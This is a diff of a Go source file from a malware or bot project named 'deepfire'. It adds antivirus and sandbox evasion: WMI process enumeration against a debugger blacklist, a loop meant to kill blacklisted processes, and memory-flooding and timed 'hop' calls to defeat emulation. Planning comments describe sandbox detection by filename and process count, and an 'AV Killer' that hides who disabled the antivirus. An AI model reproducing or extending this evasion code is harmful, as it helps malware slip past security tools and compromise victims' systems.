@@ -1,26 +1,85 @@
+//Work on Active Scanning (use channels )
+
+//Macro Analysis
+//The first in the series of new checks in the macro looks at the Microsoft Word filename itself.
+//It checks whether the filename contains only hexadecimal characters (from the set of “0123456789ABCDEFabcdef”) before the extension, and if it does, the macro does not proceed to infect the victim.
+//This is a common occurrence with files submitted to sandboxes, which often use SHA256 or MD5 hash as the filename, which only contain hexadecimal characters.
+//If any other characters, such as other letters after “f”, underscores, or spaces are present, this check succeeds and the macro continues.
+//In addition, filenames need to have a “.”, followed by any extension.
+
+//Check for number of running processes (Less then 50 = VM?)
+
+//AV Killer to make a clone and run with command, ask for Admin if needed
+//AV Killer must use seperate process to prevent any AV from knowing who really did it.
+
+//ReWork Memory Allocation to Random
+
 package deepfire
 
-var MagicNumber int64 = 0
+import (
+	"bytes"
+	"math/rand"
+	"time"
 
-func BypassAV(Rate int) {
-	if Rate == 1 {
-		AllocateFakeMemory()
-	} else if Rate == 2 {
-		AllocateFakeMemory()
-		Jump()
-	} else if Rate == 3 {
-		AllocateFakeMemory()
-		Jump()
-		CheckDebugger()
+	"github.com/StackExchange/wmi"
+)
+
+var magicNumber int64 = 0
+
+func checkForProc(proc string) bool {
+	var dst []Win32_Process
+	q := wmi.CreateQuery(&dst, "")
+	err := wmi.Query(q, &dst)
+	if err != nil {
+		return false
+	}
+	for _, v := range dst {
+		if bytes.Contains([]byte(v.Name), []byte(proc)) {
+			return true
+		}
+	}
+	return false
+}
+
+func randInt(min int, max int) int {
+	rand.Seed(time.Now().UTC().UnixNano())
+	return min + rand.Intn(max-min)
+}
+
+func goToSleep(sleeptime int) { //Makes the bot sleep
+	//NewDebugUpdate("Sleeping for " + string(sleeptime) + " Seconds...")
+	time.Sleep(time.Duration(sleeptime) * time.Second)
+}
+
+func detectDebugProc() bool { //Process Detection
+	for i := 0; i < len(debugBlacklist); i++ {
+		if checkForProc(debugBlacklist[i]) {
+			return true
+		}
+	}
+	return false
+}
+
+//============================================================
+//                   Anti-Process
+//============================================================
+func antiProc() {
+	for {
+		time.Sleep(time.Duration(randInt(500, 1000)) * time.Millisecond)
+		//Scan for Blacklisted Proc
+		//Ig found attempt to kill it
 	}
 }
 
-func Jump() {
-	MagicNumber++
-	hop1()
+//============================================================
+//                   Anti-Virus Bypass
+//============================================================
+func BypassAV() {
+	allocateMemory()
+	jump()
 }
 
-func AllocateFakeMemory() {
+func allocateMemory() {
 	for i := 0; i < 1000; i++ {
 		var Size int = 30000000
 		Buffer_1 := make([]byte, Size)
@@ -30,50 +89,56 @@ func AllocateFakeMemory() {
 	}
 }
 
-func CheckDebugger() {
-	Flag, _, _ := IsDebuggerPresent.Call()
-	if Flag != 0 {
-		//Debugger Active !!
-		CheckDebugger()
-	}
+func jump() {
+	magicNumber++
+	hop1()
 }
 
 func hop1() {
-	MagicNumber++
+	magicNumber++
+	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
 	hop2()
 }
 func hop2() {
-	MagicNumber++
+	magicNumber++
+	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
 	hop3()
 }
 func hop3() {
-	MagicNumber++
+	magicNumber++
+	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
 	hop4()
 }
 func hop4() {
-	MagicNumber++
+	magicNumber++
+	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
 	hop5()
 }
 func hop5() {
-	MagicNumber++
+	magicNumber++
+	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
 	hop6()
 }
 func hop6() {
-	MagicNumber++
+	magicNumber++
+	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
 	hop7()
 }
 func hop7() {
-	MagicNumber++
+	magicNumber++
+	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
 	hop8()
 }
 func hop8() {
-	MagicNumber++
+	magicNumber++
+	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
 	hop9()
 }
 func hop9() {
-	MagicNumber++
+	magicNumber++
+	time.Sleep(time.Duration(randInt(100, 250)) * time.Nanosecond)
 	hop10()
 }
 func hop10() {
-	MagicNumber++
+	magicNumber++
 }
